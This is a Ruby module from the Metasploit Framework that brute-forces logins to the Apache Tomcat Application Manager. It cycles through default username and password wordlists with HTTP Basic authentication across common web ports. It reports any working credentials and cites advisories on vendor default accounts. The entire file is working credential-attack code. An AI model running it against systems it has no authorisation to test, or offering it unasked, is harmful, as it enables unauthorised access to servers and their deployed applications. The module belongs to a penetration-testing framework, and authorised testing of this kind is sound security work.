##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'Tomcat Application Manager Login Utility',
			'Version'        => '$Revision$',
			'Description'    => 'This module simply attempts to login to a Tomcat Application Manager instance using a specific user/pass.',
			'References'  =>
				[
					# HP Default user/pass
					[ 'OSVDB', '60317' ],
					[ 'CVE', '2009-3843' ],
					[ 'URL', 'http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html' ],
					# IBM Cognos Express Default user/pass
					[ 'BID', '38084' ],
					[ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179' ],
					# General
					[ 'URL', 'http://tomcat.apache.org/' ]
				],
			'Author'         => [ 'MC', 'Matteo Cantoni <goony[at]nothink.org>', 'jduck' ],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8080),
				OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_userpass.txt") ]),
				OptPath.new('USER_FILE',  [ false, "File containing users, one pair per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_users.txt") ]),
				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one pair per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_pass.txt") ]),
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
					'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
			], self.class)
		register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
	end

	def run_host(ip)

		res = send_request_cgi({
			'uri'     => "/manager/html",
			'method'  => 'GET'
		}, 25)

		return if not res
		return if not res.code == 401

		each_user_pass { |user, pass|
			do_login(user, pass)
		}
	end

	def do_login(user='tomcat', pass='tomcat')
		verbose = datastore['VERBOSE']
		vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' with password:'#{pass}'")
		success = false
		srvhdr = '?'
		user_pass = Rex::Text.encode_base64(user + ":" + pass)

		begin
			res = send_request_cgi({
				'uri'     => "/manager/html",
				'method'  => 'GET',
				'headers' =>
					{
						'Authorization' => "Basic #{user_pass}",
					}
				}, 25)
			unless (res.kind_of? Rex::Proto::Http::Response)
				vprint_error("http://#{rhost}:#{rport}/manager/html not responding")
				return :abort
		  end
			return :abort if (res.code == 404)
			srvhdr = res.headers['Server']
			if res.code == 200
				# Could go with res.headers["Server"] =~ /Apache-Coyote/i
				# as well but that seems like an element someone's more
				# likely to change
				success = true if(res.body.scan(/Tomcat/i).size >= 5)
				success
			end

		rescue ::Rex::ConnectionError
			vprint_error("http://#{rhost}:#{rport}/manager/html Unable to attempt authentication")
			return :abort
		end

		if success
			print_good("http://#{rhost}:#{rport}/manager/html [#{srvhdr}] [Tomcat Application Manager] successful login '#{user}' : '#{pass}'")
			report_auth_info(
				:host   => rhost,
				:proto  => 'tomcat',
				:user   => user,
				:pass   => pass,
				:target_host => rhost,
				:target_port => rport,
				:critical => true
			)
			return :next_user
		else
			vprint_error("http://#{rhost}:#{rport}/manager/html [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'")
			return
		end
	end
end

